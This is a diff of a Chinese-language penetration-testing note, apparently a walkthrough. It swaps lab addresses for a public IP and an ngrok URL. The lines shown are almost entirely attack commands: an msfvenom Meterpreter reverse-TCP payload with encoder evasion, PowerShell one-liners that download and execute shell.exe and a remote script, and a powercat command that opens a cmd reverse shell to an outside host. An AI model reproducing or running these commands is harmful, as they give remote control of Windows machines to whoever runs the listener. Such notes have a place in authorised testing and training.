@@ -52,17 +52,21 @@ powershell iex (New-Object Net.WebClient).DownloadString('http://10.4.20.202/Inv
 生成reverse_shell
 
 ```shell
-msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.4.20.202 LPORT=4444 -f exe -o shell.exe
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=115.236.153.174 LPORT=16806 -f exe -o shell.exe
 ```
 
 下载shell并执行
 
 ```
-powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.4.20.202:80/shell.exe','shell.exe')"
+powershell "(New-Object System.Net.WebClient).Downloadfile('https://efc4-183-134-99-166.ngrok-free.app/shell.exe','shell.exe')"
 //在之前的shell上执行
 Start-Process "shell.exe"
 ```
 
+
+```python
+powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 115.236.153.174 -p 16806 -e cmd
+```
 msf本地监听
 
 ```shell
